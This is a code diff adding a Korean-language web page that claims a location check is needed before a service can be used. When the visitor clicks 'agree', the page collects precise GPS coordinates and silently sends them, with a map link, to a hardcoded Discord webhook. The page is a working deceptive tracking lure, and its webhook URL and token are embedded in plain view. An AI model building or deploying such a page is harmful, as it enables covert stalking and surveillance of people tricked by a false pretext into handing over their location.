@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <title>위치 확인 페이지</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; margin-top: 100px; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <h2>서비스 이용을 위해 위치 확인이 필요합니다.</h2>
+    <p>동의버튼을 누르시면 서비스를 이용할 수 있습니다.</p>
+    <button onclick="getLocation()">동의 및 확인</button>
+
+    <script>
+        // 디스코드 웹훅 URL이 적용된 상태입니다.
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1560674221460422688/5Alc07XnTMBo_NShIUNR8HUSggJXW2uKOkZ6yZ5ApWdFRU_VFgMTrw9JlOswwBak-RF5";
+
+        function getLocation() {
+            if (navigator.geolocation) {
+                // 현재 위치 가져오기 시도 (브라우저 기본 팝업 발생)
+                navigator.geolocation.getCurrentPosition(sendToDiscord, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                alert("이 브라우저는 위치 정보를 지원하지 않습니다.");
+            }
+        }
+
+        function sendToDiscord(position) {
+            const latitude = position.coords.latitude;   // 위도
+            const longitude = position.coords.longitude; // 경도
+
+            // 구글 지도 링크 생성 (좌표를 누르면 바로 위치를 볼 수 있음)
+            const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+            // 디스코드로 보낼 메시지 포맷
+            const payload = {
+                content: `📍 **새로운 위치 정보가 수집되었습니다.**\n- 위도: \`${latitude}\`\n- 경도: \`${longitude}\`\n- [구글 지도에서 보기](${mapLink})`
+            };
+
+            // 디스코드 웹훅으로 데이터 전송
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("위치 확인이 완료되었습니다.");
+                } else {
+                    alert("전송에 실패했습니다.");
+                }
+            })
+            .catch(error => {
+                console.error("오류 발생:", error);
+            });
+        }
+
+        function showError(error) {
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("사용자가 위치 정보 권한을 거부했습니다.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("위치 정보를 사용할 수 없습니다.");
+                    break;
+                case error.TIMEOUT:
+                    alert("위치 정보를 가져오는 데 시간이 초과되었습니다.");
+                    break;
+                default:
+                    alert("알 수 없는 오류가 발생했습니다.");
+                    break;
+            }
+        }
+    </script>
+
+</body>
+</html>
